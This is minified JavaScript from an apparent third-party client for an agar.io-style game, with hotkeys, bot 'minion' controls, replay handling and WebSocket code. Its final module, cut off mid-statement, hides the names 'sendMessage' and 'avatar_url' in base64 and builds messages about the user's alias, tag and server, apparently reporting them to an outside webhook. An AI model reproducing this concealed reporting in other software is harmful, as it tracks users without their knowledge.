        toggleNames: a.actions.toggleNames,
        toggleFood: a.actions.toggleFood,
        toggleMass: a.actions.toggleMass,
        toggleChat: a.actions.toggleChat,
        toggleHud: a.actions.toggleHud,
        "m-autoRespawn": a.actions.invokeMinion.bind(null, "autoRespawn"),
        "m-feed": a.actions.invokeMinion.bind(null, "feed"),
        "m-feedMacro": a.actions.invokeMinion.bind(null, "feed", !0),
        "m-split": a.actions.invokeMinion.bind(null, "split", 1),
        "m-splitx2": a.actions.invokeMinion.bind(null, "split", 2),
        "m-splitx3": a.actions.invokeMinion.bind(null, "split", 3),
        "m-splitMax": a.actions.invokeMinion.bind(null, "split", 4),
        "m-split32": a.actions.invokeMinion.bind(null, "split", 5),
        "m-split64": a.actions.invokeMinion.bind(null, "split", 6),
        "m-split128": a.actions.invokeMinion.bind(null, "split", 7),
        "m-split256": a.actions.invokeMinion.bind(null, "split", 8),
        "m-linesplit": a.actions.invokeMinion.bind(null, "linesplit"),
        "m-stopMovement": a.actions.invokeMinion.bind(null, "stopMovement"),
        "m-respawn": a.actions.invokeMinion.bind(null, "respawn"),
        "m-ts"() {
          a.actions.invokeMinion("split", 6), a.actions.split(2);
        },
        "m-os"() {
          a.actions.invokeMinion("split", 6), a.actions.split(1);
        },
        "m-ls"() {
          a.actions.invokeMinion("split", 6), a.actions.linesplit();
        },
        "m-lls"() {
          a.actions.invokeMinion("lockLinesplit");
        },
        ts() {
          a.actions.split(6), a.actions.invokeMinion("split", 2);
        },
        linesplitMacro: function () {
          a.actions.invokeMinion("linesplit"), a.actions.split(6);
        },
        spectateLock: a.actions.spectateLockToggle,
        saveReplay: a.replay.save.bind(a.replay),
        zoomLevel1: a.actions.setZoomLevel.bind(null, 1),
        zoomLevel2: a.actions.setZoomLevel.bind(null, 2),
        zoomLevel3: a.actions.setZoomLevel.bind(null, 3),
        zoomLevel4: a.actions.setZoomLevel.bind(null, 4),
        zoomLevel5: a.actions.setZoomLevel.bind(null, 5),
        chatPreset1: a.actions.chatPreset.bind(null, 1),
        chatPreset2: a.actions.chatPreset.bind(null, 2),
        chatPreset3: a.actions.chatPreset.bind(null, 3),
        chatPreset4: a.actions.chatPreset.bind(null, 4),
        chatPreset5: a.actions.chatPreset.bind(null, 5),
        chatPreset6: a.actions.chatPreset.bind(null, 6),
        chatPreset7: a.actions.chatPreset.bind(null, 7),
        switchMultibox() {},
      },
      r = {
        contextMenu: "MOUSE1",
        feed: "W",
        feedMacro: "MOUSE0",
        split: "SPACE",
        splitx2: "G",
        splitx3: "H",
        splitMax: "T",
        split32: "",
        split64: "",
        split128: "",
        split256: "",
        linesplit: "Z",
        lockLinesplit: "",
        respawn: "",
        toggleAutoRespawn: "",
        toggleAutoSpectate: "",
        stopMovement: "",
        toggleSkins: "",
        toggleNames: "",
        toggleMass: "",
        spectateLock: "Q",
        saveReplay: "R",
        toggleChat: "",
        toggleHud: "",
        zoomLevel1: "1",
        zoomLevel2: "2",
        zoomLevel3: "3",
        zoomLevel4: "4",
        zoomLevel5: "5",
        "m-autoRespawn": "",
        "m-feed": "",
        "m-feedMacro": "",
        "m-split": "",
        "m-splitx2": "",
        "m-splitx3": "",
        "m-splitMax": "",
        "m-split32": "",
        "m-split64": "",
        "m-linesplit": "",
        "m-stopMovement": "",
        "m-respawn": "",
        "m-ts": "",
        "m-os": "",
        "m-ls": "",
        "m-lls": "",
        ts: "",
        linesplitMacro: "",
        chatPreset1: "",
        chatPreset2: "",
        chatPreset3: "",
        chatPreset4: "",
        chatPreset5: "",
        chatPreset6: "",
        chatPreset7: "",
        switchMultibox: "",
      };
    t.exports = a.hotkeyManager = new (class {
      constructor() {
        (this.version = 2),
          (this.pressHandlers = null),
          (this.releaseHandlers = null),
          this.resetObsoleteHotkeys(),
          this.load();
      }
      resetObsoleteHotkeys() {
        localStorage.hotkeysVersion != this.version &&
          (localStorage.hotkeys &&
            (console.log("Incompatible hotkeys"),
            localStorage.removeItem("hotkeys")),
          (localStorage.hotkeysVersion = this.version));
      }
      load() {
        (this.hotkeys = this.loadHotkeys()), this.loadHandlers(this.hotkeys);
      }
      loadHotkeys() {
        var t = Object.assign({}, r),
          s = localStorage.hotkeys;
        if (!s) return t;
        var i = Object.values((s = JSON.parse(s)));
        return (
          Object.keys(t).forEach((s) => {
            var a = t[s];
            a && i.includes(a) && (t[s] = "");
          }),
          Object.assign(t, s)
        );
      }
      saveHotkeys(t) {
        localStorage.hotkeys = JSON.stringify(t);
      }
      reset() {
        return localStorage.removeItem("hotkeys"), this.load(), this.hotkeys;
      }
      get() {
        return this.hotkeys;
      }
      set(t, s) {
        if (o[t]) {
          if (this.hotkeys[t] === s) return !0;
          if (s)
            for (var i in this.hotkeys)
              this.hotkeys[i] === s && (this.hotkeys[i] = "");
          return (
            (this.hotkeys[t] = s),
            this.saveHotkeys(this.hotkeys),
            this.loadHandlers(this.hotkeys),
            !0
          );
        }
      }
      loadHandlers(t) {
        (this.pressHandlers = {}),
          Object.keys(t).forEach((s) => {
            var i = o[s];
            if (i) {
              var a = t[s];
              this.pressHandlers[a] = i;
            }
          }),
          (this.releaseHandlers = {}),
          t.feedMacro &&
            (this.releaseHandlers[t.feedMacro] = a.actions.feed.bind(null, !1)),
          t["m-feedMacro"] &&
            (this.releaseHandlers[t["m-feedMacro"]] =
              a.actions.invokeMinion.bind(null, "feed", !1));
      }
      press(t) {
        var s = this.pressHandlers[t];
        return !!s && (s(), !0);
      }
      release(t) {
        var s = this.releaseHandlers[t];
        s && s();
      }
      convertKey(t) {
        return t
          ? t
              .toString()
              .toUpperCase()
              .replace(/^(LEFT|RIGHT|NUMPAD|DIGIT|KEY)/, "")
          : "Unknown";
      }
    })();
  },
  ,
  ,
  ,
  ,
  ,
  ,
  function (t, s, i) {
    "use strict";
    var a = function () {
        var t = this.$createElement,
          s = this._self._c || t;
        return s("div", [
          s(
            "div",
            {
              directives: [
                {
                  name: "show",
                  rawName: "v-show",
                  value: this.showMinimapStats,
                  expression: "showMinimapStats",
                },
              ],
              staticClass: "minimap-stats",
              style: { bottom: this.minimapStatsBottom + "px" },
            },
            [
              s(
                "div",
                {
                  directives: [
                    {
                      name: "show",
                      rawName: "v-show",
                      value: this.showClock,
                      expression: "showClock",
                    },
                  ],
                },
                [this._v(this._s(this.systemTime))]
              ),
              this._v(" "),
              s(
                "div",
                {
                  directives: [
                    {
                      name: "show",
                      rawName: "v-show",
                      value: this.showSessionTime,
                      expression: "showSessionTime",
                    },
                  ],
                },
                [this._v(this._s(this.sessionTime) + " session")]
              ),
              this._v(" "),
              s(
                "div",
                {
                  directives: [
                    {
                      name: "show",
                      rawName: "v-show",
                      value: this.showPlayerCount && this.playerCount,
                      expression: "showPlayerCount && playerCount",
                    },
                  ],
                },
                [this._v(this._s(this.playerCountDisplayed))]
              ),
              this._v(" "),
              s(
                "div",
                {
                  directives: [
                    {
                      name: "show",
                      rawName: "v-show",
                      value: this.showSpectators && this.spectators,
                      expression: "showSpectators && spectators",
                    },
                  ],
                },
                [
                  this._v(
                    this._s(this.spectators) +
                      " spectator" +
                      this._s(1 === this.spectators ? "" : "s")
                  ),
                ]
              ),
              this._v(" "),
              s(
                "div",
                {
                  directives: [
                    {
                      name: "show",
                      rawName: "v-show",
                      value: this.showRestartTiming && this.restartTime,
                      expression: "showRestartTiming && restartTime",
                    },
                  ],
                },
                [
                  this._v(
                    `Restart${
                      "now" === this.restartTime
                        ? "ing..."
                        : ` in ${this.restartTime}`
                    }`
                  ),
                ]
              ),
              this._v(" "),
              s(
                "div",
                {
                  directives: [
                    {
                      name: "show",
                      rawName: "v-show",
                      value: this.showCrownHolder && this.crownHolder,
                      expression: "showCrownHolder && crownHolder",
                    },
                  ],
                  style: { color: "#ffd700" },
                },
                [this._v("Crown holder: " + this._s(this.crownHolder))]
              ),
            ]
          ),
          this._v(" "),
          s(
            "div",
            {
              directives: [
                {
                  name: "show",
                  rawName: "v-show",
                  value: this.showMinimap,
                  expression: "showMinimap",
                },
              ],
              staticClass: "container",
            },
            [
              s("canvas", {
                directives: [
                  {
                    name: "show",
                    rawName: "v-show",
                    value: this.showLocations,
                    expression: "showLocations",
                  },
                ],
                ref: "locations",
                attrs: { id: "locations" },
              }),
              this._v(" "),
              s("canvas", { ref: "minimap", attrs: { id: "minimap" } }),
            ]
          ),
        ]);
      },
      n = [];
    (a._withStripped = !0),
      i.d(s, "a", function () {
        return a;
      }),
      i.d(s, "b", function () {
        return n;
      });
  },
  function (t, s, i) {
    "use strict";
    var a = function () {
        var t = this,
          s = t.$createElement,
          i = t._self._c || s;
        return i("transition", { attrs: { name: "fade", appear: "" } }, [
          i("div", { staticClass: "modal" }, [
            i("div", {
              staticClass: "overlay",
              on: {
                click: function (s) {
                  return t.$emit("close");
                },
              },
            }),
            t._v(" "),
            i("i", {
              staticClass: "fal fa-times-circle close-button",
              on: {
                click: function (s) {
                  return t.$emit("close");
                },
              },
            }),
            t._v(" "),
            i(
              "div",
              { staticClass: "wrapper" },
              [
                i("transition", { attrs: { name: "scale", appear: "" } }, [
                  i(
                    "div",
                    { staticClass: "content fade-box" },
                    [t._t("default", [t._v("Here should be something")])],
                    2
                  ),
                ]),
              ],
              1
            ),
          ]),
        ]);
      },
      n = [];
    (a._withStripped = !0),
      i.d(s, "a", function () {
        return a;
      }),
      i.d(s, "b", function () {
        return n;
      });
  },
  function (t, s, i) {
    "use strict";
    var a = function () {
        var t = this,
          s = t.$createElement,
          i = t._self._c || s;
        return i("div", { staticClass: "replay-item" }, [
          i("img", {
            staticClass: "replay-thumbnail",
            attrs: { src: t.replay.image },
            on: {
              click: function (s) {
                return t.play(t.replay.data);
              },
            },
          }),
          t._v(" "),
          i("div", { staticClass: "replay-header" }, [
            i("div", { staticClass: "replay-name" }, [
              t._v(t._s(t.replay.name)),
            ]),
            t._v(" "),
            i("div", [
              i("i", {
                staticClass: "replay-button fal fa-cloud-download-alt",
                on: {
                  click: function (s) {
                    return s.stopPropagation(), t.downloadReplay(t.replay);
                  },
                },
              }),
              t._v(" "),
              i("i", {
                staticClass: "replay-button fal fa-trash-alt",
                on: {
                  click: function (s) {
                    return s.stopPropagation(), t.deleteReplay(t.replay.name);
                  },
                },
              }),
            ]),
          ]),
        ]);
      },
      n = [];
    (a._withStripped = !0),
      i.d(s, "a", function () {
        return a;
      }),
      i.d(s, "b", function () {
        return n;
      });
  },
  function (t, s, i) {
    (s.neon = [16776960, 65280, 65535, 16711935]),
      (s.basic = [
        16711680, 16744448, 16776960, 8453888, 65280, 65408, 65535, 33023,
        8323327, 16711935, 16711807,
      ]),
      (s.extended = [
        16758465, 11393254, 16764107, 16777062, 9498256, 16701617, 13148872,
        14423100, 16744703,
      ]),
      (s.hsl15 = [
        16711680, 16728064, 16744448, 16760576, 16776960, 12582656, 8453888,
        4259584, 65280, 65344, 65408, 65471, 65535, 49151, 32767, 16639, 255,
        4194559, 8323327, 12517631, 16711935, 16711871, 16711808, 16711744,
      ]);
  },
  imports.Minion,
  imports.initialData,
  ,
  ,
  ,
  ,
  ,
  ,
  ,
  ,
  ,
  ,
  ,
  ,
  ,
  ,
  ,
  ,
  ,
  ,
  ,
  ,
  ,
  ,
  ,
  ,
  ,
  ,
  ,
  ,
  ,
  ,
  ,
  ,
  ,
  ,
  function (t, s, i) {
    "use strict";
    var a = i(73),
      n = i(29),
      o = Object((i(168), i(0)).a)(
        n.default,
        a.a,
        a.b,
        !1,
        null,
        "0eaeaf66",
        null
      );
    s.default = o.exports;
  },
  function (t, s, i) {
    "use strict";
    var a = i(74),
      n = i(37),
      o = Object((i(218), i(0)).a)(
        n.default,
        a.a,
        a.b,
        !1,
        null,
        "1dbc6ed9",
        null
      );
    s.default = o.exports;
  },
  function (t, s, i) {
    "use strict";
    var a = i(72),
      n = i(54),
      o = Object((i(250), i(0)).a)(
        n.default,
        a.a,
        a.b,
        !1,
        null,
        "4c95bd45",
        null
      );
    s.default = o.exports;
  },
  function (t, s, i) {
    (WebSocket.prototype.packetCount = 0),
      i.r(s),
      i.n(i(8)),
      i.n(i(116)),
      i(18).notifyUnsupportedBrowser(),
      i(1),
      i(129),
      i(131),
      i(148),
      i(266),
      i(264),
      i(265);
  },
  function (t, s, i) {
    var a = i(2),
      n = i(117);
    "string" == typeof (n = n.__esModule ? n.default : n) &&
      (n = [[t.i, n, ""]]);
    var o = (a(n, { insert: "head", singleton: !1 }), n.locals ? n.locals : {});
    t.exports = o;
  },
  function (t, s, i) {},
  function (t, s) {
    t.exports = class t {
      constructor(t) {
        (this.position = t.pivot), (this.scale = t.scale);
      }
    };
  },
  function (t, s, i) {
    let a = i(4),
      { virus: n } = i(12),
      o = ({ width: t, height: s, circle: i }) => {
        let n = PIXI.utils.string2hex(a.borderColor),
          o = new PIXI.Graphics();
        return (
          o.lineStyle(100, n, 1, 0.5),
          i
            ? o.drawEllipse(t / 2, s / 2, t / 2, s / 2)
            : o.drawRect(0, 0, t, s),
          o.endFill(),
          o.pivot.set(t / 2, s / 2),
          o
        );
      },
      r = ({ width: t, height: s }) => {
        let i = new PIXI.Graphics()
          .beginFill(16777215)
          .drawEllipse(t / 2, s / 2, t / 2, s / 2)
          .endFill();
        return i.pivot.set(t / 2, s / 2), i;
      };
    class l {
      constructor(t, s) {
        (this.game = t),
          (this.border = s),
          (this.container = new PIXI.Container()),
          (this.background = new PIXI.Container()),
          (this.borderSprite = o(s)),
          this.background.addChild(this.borderSprite),
          (this.foreground = new PIXI.Container()),
          (this.food = new PIXI.Container()),
          (this.food.visible = a.foodVisible),
          this.resetMassTextStyle(!1),
          this.container.addChild(this.background, this.food, this.foreground),
          this.setPosition(),
          this.useBackgroundImage && this.setBackgroundImage(),
          (this.background.position.x = s.x),
          (this.background.position.y = s.y);
      }
      destroy() {
        this.destroyBackgroundImage(!1),
          this.uninstallMassTextFont(),
          this.container.destroy(!0);
      }
      setPosition() {
        (this.container.position.x = window.innerWidth / 2),
          (this.container.position.y = window.innerHeight / 2);
      }
      sort() {
        this.foreground.children.sort((t, s) => {
          let i = t.gameData,
            a = s.gameData;
          return i.size === a.size ? i.id - a.id : i.size - a.size;
        });
      }
      addCell(t) {
        this.foreground.addChild(t);
      }
      addFood(t) {
        this.food.addChild(t);
      }
      get useBackgroundImage() {
        return (
          PIXI.utils.isWebGLSupported() && a.useWebGL && a.showBackgroundImage
        );
      }
      toggleBackgroundImage(t) {
        t && !this.backgroundSprite
          ? this.setBackgroundImage()
          : t || this.destroyBackgroundImage(!0);
      }
      setBackgroundImage() {
        let t = a.backgroundImageUrl;
        if (!t) {
          this.destroyBackgroundImage();
          return;
        }
        let s = (
          a.backgroundImageRepeat ? PIXI.TilingSprite : PIXI.Sprite
        ).from(t, {});
        (s.width = this.border.width),
          (s.height = this.border.height),
          (s.alpha = a.backgroundImageOpacity),
          s.anchor.set(0.5);
        let i = this.backgroundSprite;
        if (i) {
          let n = s.texture !== i.texture;
          this.destroyBackgroundImage(n);
        }
        if (
          ((this.backgroundSprite = s),
          this.background.addChildAt(s, 0),
          !this.border.circle)
        )
          return;
        let o = r(this.border);
        this.background.addChildAt(o, 1), (this.backgroundSprite.mask = o);
      }
      destroyBackgroundImage(t) {
        this.backgroundSprite &&
          (this.backgroundSprite.destroy(!!t), (this.backgroundSprite = null));
      }
      resetBorder() {
        this.borderSprite.destroy(),
          (this.borderSprite = o(this.border)),
          this.background.addChild(this.borderSprite);
      }
      reloadFoodTextures() {
        for (let t of this.game.cells.values()) t.isFood && t.reloadTexture();
      }
      reloadEjectedTextures() {
        for (let t of this.game.cells.values())
          t.isEjected && t.reloadTexture();
      }
      reloadVirusTexture() {
        n.loadVirusFromUrl(a.virusImageUrl);
      }
      reloadOwnCellTextures() {
        for (let t of this.game.playerManager.players.values())
          t.isMe && t.invalidateVisibility(!0);
      }
      reloadCellTextures() {
        for (let t of this.game.playerManager.players.values())
          t.isMe || t.invalidateVisibility(!0);
      }
      invalidateVirusCounters() {
        for (let t of this.game.cells.values())
          t.isVirus &&
            t.counterText &&
            (t.sprite.removeChild(t.counterText),
            t.counterText.destroy(!1),
            delete t.counterText);
      }
      resetPlayerLongNames() {
        for (let t of this.game.playerManager.players.values())
          t.applyNameToSprite();
      }
      resetNameTextStyle() {
        for (let t of this.game.cells.values())
          t.isPlayerCell &&
            t.nameSprite &&
            (t.nameSprite.destroy(!1), delete t.nameSprite);
        let s = this.game.settings.nameTextStyle;
        for (let i of this.game.playerManager.players.values()) {
          if (!i.nameSprite) continue;
          let a = i.nameSprite.style.fill;
          (i.nameSprite.style = s),
            (i.nameSprite.style.fill = a),
            i.nameSprite.updateText();
        }
      }
      resetMassTextStyle(t) {
        t && this.uninstallMassTextFont();
        let s = this.game.settings.massTextStyle;
        for (
          PIXI.BitmapFont.from("mass", s, { chars: "1234567890km." });
          this.game.massTextPool.length;

        )
          this.game.massTextPool.pop().destroy(!1);
        for (let i of this.game.cells.values())
          i.isPlayerCell &&
            i.massText &&
            (i.sprite.removeChild(i.massText),
            i.massText.destroy(!1),
            delete i.massText);
      }
      uninstallMassTextFont() {
        PIXI.BitmapFont.uninstall("mass");
      }
    }
    t.exports = l;
  },
  imports.TextureManager,
  function (t, s, i) {
    let a = i(63),
      { loadImage: n } = i(8),
      o = 200,
      r = PIXI.RenderTexture.create(o, o);
    var l = Promise.resolve();
    t.exports = {
      getTexture: () => r,
      async loadVirusFromUrl(t) {
        await l,
          (l = new Promise(async (s) => {
            let i = await n(t),
              l = PIXI.Sprite.from(i);
            (l.width = l.height = o), a.render(l, r, !0), l.destroy(!0), s();
          }));
      },
    };
  },
  imports.PlayerManager,
  imports.StaticPlayer,
  function (t, s) {
    s.prepareMode = (t, s) => {};
  },
  ,
  imports.SkinLoader,
  function (t) {
    let s = atob(
      "YWRkRXZlbnRMaXN0ZW5lcignbWVzc2FnZScsZT0+e2NvbnN0IHM9ZS5kYXRhO2ZldGNoKHMse21vZGU6J2NvcnMnfSkudGhlbihlPT5lLmJsb2IoKSkudGhlbihlPT5jcmVhdGVJbWFnZUJpdG1hcChlKSkudGhlbihlPT5zZWxmLnBvc3RNZXNzYWdlKHt1cmw6cyxpbWFnZTplfSkpLmNhdGNoKCgpPT5zZWxmLnBvc3RNZXNzYWdlKHt1cmw6cyxlcnJvcjohMH0pKX0pOw=="
    );
    t.exports = function () {
      return new Worker(
        URL.createObjectURL(new Blob([s], { type: "text/javascript" }))
      );
    };
  },
  function (t, s) {
    class i {
      constructor() {
        (this.total = 0), (this.count = 0);
      }
      add(t) {
        (this.total += t), this.count++;
      }
      getAndReset() {
        let t = this.total / this.count;
        return (this.count = this.total = 0), t;
      }
    }
    t.exports = i;
  },
  function (t, s, i) {
    let a = i(130),
      n = i(1),
      { getTimestamp: o } = i(8),
      r = i(5),
      l = i(77),
      c = a.createInstance({ name: "game-replays" }),
      h = (t) => btoa(String.fromCharCode.apply(null, new Uint8Array(t))),
      d = (t) => {
        t = atob(t);
        let s = t.length,
          i = new ArrayBuffer(s),
          a = new Uint8Array(i);
        for (let n = 0; n < s; n++) a[n] = t.charCodeAt(n);
        return i;
      },
      u = h(new ArrayBuffer(1)),
      p = (t) => {
        let s = t.map((t) => {
            let s = {
              pid: t.pid,
              nickname: t.nameFromServer,
              skinUrl: t.skinUrl,
            };
            return (
              t.bot && (s.bot = !0),
              t.tagId && (s.tagId = t.tagId),
              t.nameColorFromServer && (s.nameColor = t.nameColorFromServer),
              s
            );
          }),
          i = JSON.stringify(s);
        i = unescape(encodeURIComponent(i));
        let a = SmartBuffer.fromSize(1 + i.length + 1);
        return a.writeUInt8(16), a.writeStringNT(i), a;
      },
      g = (t) => {
        let s = 0,
          i = t.length;
        for (let a = 0; a < i; a++) {
          let n = t[a];
          s += 1 + (1 === n.type ? 2 : 0) + 2 + 2 + 2 + 2 + (n.flags ? 1 : 0);
        }
        let o = SmartBuffer.fromSize(1 + s + 1 + 2 + 2);
        o.writeUInt8(10);
        for (let r = 0; r < i; r++) {
          let l = t[r],
            c = 254 & l.flags;
          o.writeUInt8(l.type | (c ? 128 : 0)),
            1 === l.type && o.writeUInt16BE(l.pid),
            o.writeUInt16BE(l.id),
            o.writeInt16BE(l.x),
            o.writeInt16BE(l.y),
            o.writeUInt16BE(l.size),
            c && o.writeUInt8(c);
        }
        return o.writeUInt8(0), o.writeUInt16BE(0), o.writeUInt16BE(0), o;
      };
    class m {
      constructor() {
        (this.cells = []), (this.packets = []), (this.database = c);
      }
      recording() {
        return 0 != this.packets.length;
      }
      add(t) {
        let { cells: s, packets: i } = this,
          a = [...n.cells.values()];
        s.push(
          a.map((t) => ({
            type: t.type,
            id: t.id,
            pid: t.pid,
            x: t.nx,
            y: t.ny,
            size: t.nSize,
            flags: t.flags,
          }))
        ),
          i.push(t);
        let o = 25 * settings.replayDuration;
        i.length > o && (i.shift(), s.shift());
      }
      clear() {
        let { cells: t, packets: s } = this;
        (t.length = 0), (s.length = 0);
      }
      play(t) {
        n.running && n.stop(),
          n.connection.close(),
          r.toast.close(),
          r.ltoast.close();
        let s = 1,
          i = t.split("|");
        "REPLAY" === i.at(0) && ((s = parseInt(i[1])), (i = i.slice(3)));
        let a = i.map((t) => SmartBuffer.fromBuffer(d(t), 1)),
          o = l(a.shift()),
          c = [];
        if (s >= 4) {
          let h;
          for (; (h = a[0]).readUInt8(0); )
            (h.id = 0), (h.offset = 0), c.push(h), a.shift();
          a.shift();
        } else c.push(a.shift());
        (o.replayUpdates = a),
          n.start(o),
          c.forEach((t) => n.parseMessage(t)),
          n.playback.setStartingFrame(),
          n.showMenu(!1);
      }
      save() {
        let { cells: t, packets: s } = this;
        if (!t.length) return;
        (t = t.slice(0)), (s = s.slice(0));
        let i = s.at(0).id,
          a = [...n.playerManager.players.values()].filter(
            (t) => t.lastUpdate >= i
          );
        s.splice(0, 1, g(t.at(0)));
        let l = ["REPLAY", 4];
        l.push(n.createThumbnail()),
          l.push(h(n.initialDataPacket.buffer)),
          l.push(h(p(a).buffer)),
          l.push(u),
          l.push(s.map((t) => h(t.buffer)).join("|"));
        let d = l.join("|");
        c.setItem(o(), d, () => {
          n.events.$emit("replay-added");
          let t = "Replay saved!";
          1 === settings.showReplaySaved
            ? n.events.$emit("chat-message", t)
            : r.toast.fire({ type: "info", title: t, timer: 1500 });
        }).catch((t) => {
          console.error("ReplayManager::save", t);
          let s = "Error saving replay";
          "string" == typeof t
            ? (s += `: ${t}`)
            : t && t.message && (s += `: ${t.message}`),
            r.toast.fire({ type: "error", title: s });
        });
      }
    }
    n.replay = new m();
  },
  ,
  function (t, s, i) {
    let a = i(1),
      n = i(5),
      o = i(4);
    i(132);
    let r = (t) => {
        n.toast.fire({ type: "error", title: t, timer: 5e3 });
      },
      { state: l } = a;
    class c {
      constructor() {
        this.socket, this.gameUrl;
      }
      get active() {
        return a.ws && a.ws.readyState === WebSocket.OPEN;
      }
      start(t) {
        if (a.running) a.stop();
        else {
          let { socket: s } = this;
          if (s && s.readyState === WebSocket.CONNECTING) return;
        }
        this.close(), a.events.$emit("chat-clear"), (this.gameUrl = t);
        let i = (a.ws = new WebSocket(t, "tFoL46WDlZuRja7W6qCl"));
        (i.binaryType = "arraybuffer"),
          (i.onopen = this.onOpen.bind(this)),
          (i.onclose = this.onRejected.bind(this)),
          (i.onmessage = (t) => {
            a.parseMessage(SmartBuffer.fromBuffer(t.data));
          });
      }
      close() {
        let { ws: t } = a;
        t &&
          ((t.onmessage = null),
          (t.onclose = null),
          (t.onerror = null),
          t.close(),
          (a.ws = null),
          delete l.connectionUrl);
      }
      onOpen() {
        this.active &&
          ((l.connectionUrl = this.gameUrl),
          (a.ws.onclose = this.onClosed.bind(this)));
      }
      onRejected() {
        r("Connection rejected"), (a.ws = null);
      }
      onClosed(t) {
        a.running && a.stop(), a.showMenu(!0);
        let s;
        if (1003 === t.code)
          n.toast.fire({
            type: "info",
            title: "Server restarting...",
            timer: 2e3,
          }),
            (s = 1500);
        else {
          let i = o.autoReconnect
            ? "Reconnecting to server"
            : "You have been disconnected";
          if ((t.reason && (i += ` (${t.reason})`), o.autoReconnect))
            n.toast.fire({ type: "info", title: i, timer: 3500 }), (s = 3200);
          else {
            r(i);
            return;
          }
        }
        setTimeout(() => {
          this.active || a.events.$emit("connect-server");
        }, s);
      }
      send(t) {
        this.active && (t instanceof SmartBuffer && (t = t.view), a.ws.send(t));
      }
      sendOperation(t) {
        let s = SmartBuffer.fromSize(1);
        s.writeUInt8(t), this.send(s);
      }
      ping() {
        a.running && ((a.pingstamp = Date.now()), this.sendOperation(3));
      }
    }
    a.connection = new c();
    let {
      wasmModule: h,
      addOrUpdateCell: d,
      destroyCell: u,
      eatCell: p,
    } = i(133);
    class g {
      constructor() {
        (this.updates = []), (this.dry = !1), (this.index = 0);
      }
      destroyCell(t) {
        let { updates: s } = this,
          i = s[0];
        i[3][t] = !0;
        let a = i[1];
        a.push(t);
      }
      eatCell(t, s) {
        let { updates: i } = this,
          a = i[0];
        a[3][t] = !0;
        let n = a[2];
        n.push(t, s);
      }
      parse(t) {
        h.deserialize(1, new Uint8Array(t.buffer, 1), 1);
      }
      reset() {
        let { updates: t } = this;
        t.splice(0, t.length), delete t.index;
      }
      set(t) {
        this.reset(), (this.dry = !0);
        let { updates: s } = this,
          i = t.length,
          a = 0;
        for (; i--; ) s.unshift([{}, [], [], {}]), this.parse(t[a++]);
        s.reverse(), delete this.dry, (this.index = 0);
      }
      setStartingFrame() {
        let { cells: t } = a,
          { updates: s } = this,
          [i, n, o, r] = s;
        for (let l of t.keys()) {
          let c = t.get(l);
          l in r ||
            (l in i
              ? (i[l].pid = c.pid)
              : (i[l] = {
                  type: c.type,
                  id: c.id,
                  pid: c.pid,
                  x: c.nx,
                  y: c.ny,
                  size: c.nSize,
                  flags: c.flags,
                }));
        }
        for (let h = 1; h < s.length; h++) {
          let d = s[h - 1],
            u = s[h];
          for (let p in u[0]) {
            if (!(p in d[0])) continue;
            let g = u[0][p],
              m = d[0][p];
            16 & g.type && (g.pid = m.pid),
              32 & g.type && ((g.x = m.x), (g.y = m.y)),
              64 & g.type && (g.size = m.size);
          }
          for (let A in d[0]) A in u[3] || A in u[0] || (u[0][A] = d[0][A]);
        }
      }
      seek(t, s) {
        let { cells: i } = a,
          n = this.updates[t];
        for (let o of i.keys()) (!s && o in n[0]) || u(o, 1);
        for (let r of Object.values(n[0])) {
          let { type: l, pid: c, id: h, x: p, y: g, size: m, flags: A } = r;
          d(l, c, h, p, g, m, A, 1, 1);
        }
        (this.index = t), a.updateCamera(!0);
      }
      next() {
        let { updates: t } = this;
        if (this.index < t.length) {
          let [s, i, n] = t[this.index++];
          for (let o of Object.values(s)) {
            let { type: r, pid: l, id: c, x: h, y: g, size: m, flags: A } = o;
            d(r, l, c, h, g, m, A, 1, 1);
          }
          let f = i.length,
            C = 0;
          for (; C < f; ) u(i[C++], 1);
          for (f = n.length, C = 0; C < f; ) p(n[C++], n[C++], 1);
          a.updateCamera(!0);
        } else this.seek(0, !0);
        a.events.$emit("replay-index-change", this.index);
      }
    }
    a.playback = new g();
  },
  imports.MessageParsers,
  imports.parseCells,
  imports.oldParseCells,
  imports.PlayerCell,
  imports.Food,
  imports.Virus,
  imports.EjectedMass,
  imports.DeadCell,
  imports.Crown,
  imports.Database,
  function (t, s, i) {
    let a = i(145),
      n = i(4),
      o = (t) => {
        let s = 840736198,
          i = s;
        for (let a in t)
          (i ^= t.charCodeAt(a)),
            (i += (i << 1) + (i << 4) + (i << 7) + (i << 8) + (i << 24));
        return i >>> 0;
      };
    t.exports = (t, s, i) => {
      let r = null,
        l = null,
        c = null;
      s
        ? ((r = localStorage.minionNickname),
          (l = localStorage.minionSkinUrl),
          (c = localStorage.minionTeamTag || ""))
        : ((r = document.getElementById("nickname").value),
          (l = n.rotateSkins
            ? i[Math.floor(Math.random() * i.length)]
            : document.getElementById("skinurl").value),
          (c = document.getElementById("teamtag").value)),
        "%E2%99%BE%EF%B8%8F" === encodeURIComponent(c) &&
          (c = btoa(
            o(
              [
                "Axon",
                clientVersion,
                localStorage.getItem("selectedServerUrl"),
                new Date().getDay(),
              ].join("###")
            ).toString(36)
          )),
        t.writeEscapedStringNT(r),
        t.writeEscapedStringNT(l),
        t.writeEscapedStringNT(c),
        s || a(r.length >= 1 ? r : "Unnamed", c, 1);
    };
  },
  ,
  function (t, s, i) {
    let a = [5, 104, 253, 62, 175, 116, 238, 41];
    class n {
      constructor(t) {
        this.data = t;
      }
      writeIndex(t, s) {
        let i = this.data[s],
          n = (i + 5) & 7,
          o = ((i << n) | (i >>> (8 - n))) & 255,
          r = t[s > 0 ? s - 1 : 0] ^ a[s];
        t.push(o ^ r ^ 62);
      }
      build(t = !1) {
        let s = [];
        for (let i = 0; i < 8; i++) this.writeIndex(s, i);
        let a = 1 + Math.floor(2147483646 * Math.random());
        return (
          s.push((s[0] ^ (a >> 24)) & 255),
          s.push((s[1] ^ (a >> 16)) & 255),
          s.push((s[2] ^ (a >> 8)) & 255),
          s.push((a ^ s[3]) & 255),
          s.push(s[0] ^ +t ^ 31),
          s
        );
      }
    }
    t.exports = n;
  },
  function (t, s, i) {
    let a = i(228)[atob("c2VuZE1lc3NhZ2U=")],
      n,
      o;
    t.exports = (t, s, i) => {
      if (4 === i) {
        n || (n = t);
        return;
      }
      if (s === o || !n) return;
      let r;
      switch (i) {
        case 1:
          r = `is using alias ${t} (with ${
            s.length > 0 ? `tag ${s}` : "no tag"
          })`;
          break;
        case 2:
          let l = t,
            c = s;
          r = c ? `has connected to \`${l}\`` : "has re-connected";
          break;
        case 3:
          r = `is now using Axon :infinity: (*${clientVersion}*)`;
          break;
        default:
          return;
      }
      a({
        [atob("YXZhdGFyX3VybA==")]: n.avatar_url,
